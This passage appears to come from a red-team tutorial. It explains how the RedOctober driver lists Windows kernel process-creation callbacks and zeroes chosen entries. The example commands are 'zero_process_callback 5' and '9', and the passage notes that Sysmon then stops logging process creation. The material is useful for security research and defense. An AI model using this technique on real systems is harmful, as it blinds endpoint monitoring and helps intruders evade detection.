This abuse is provided in the RedOctober driver.  First, we list all the process callbacks with the `list_process_callbacks` command.  This works by finding the PspCreateProcessNotifyRoutine array in kernel memory, walking each entry and resolving the module in which the callback address is pointing.  Some interesting canditates stand out.

We can then use the `zero_process_callback` command to a callback (referenced by its index in the array).  This works by patching out the function pointer with 0x0.

```
zero_process_callback 5
zero_process_callback 9
```

When we list the callbacks again, we see that entries 5 and 9 are no longer there.

In the particular case of Sysmon, you can verify that this worked by clearing out the logs from Microsoft-Windows-Sysmon/Operational and starting a new process.  Event ID 1 (process created) logs will no longer be generated.